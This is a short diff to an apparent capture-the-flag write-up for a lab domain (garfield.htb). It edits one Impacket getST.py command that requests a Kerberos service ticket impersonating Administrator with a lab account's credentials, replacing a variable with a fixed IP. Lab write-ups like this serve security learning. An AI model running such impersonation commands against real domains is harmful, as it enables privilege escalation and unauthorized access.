@@ -448,6 +448,8 @@ Ill then select the new session, add the new interface and add the routing info 
 I can now ping the device
 
 ```python
-❯❯❯ getST.py -spn 'cifs/RODC01.garfield.htb' -impersonate "Administrator" -dc-ip "$DC_IP" 'garfield.htb/l.wilson_adm:Password123!'
+❯❯❯ getST.py -spn 'cifs/RODC01.garfield.htb' -impersonate "Administrator" -dc-ip "192.168.100.2" 'garfield.htb/l.wilson_adm:Password123!'
 ```
+
+
 
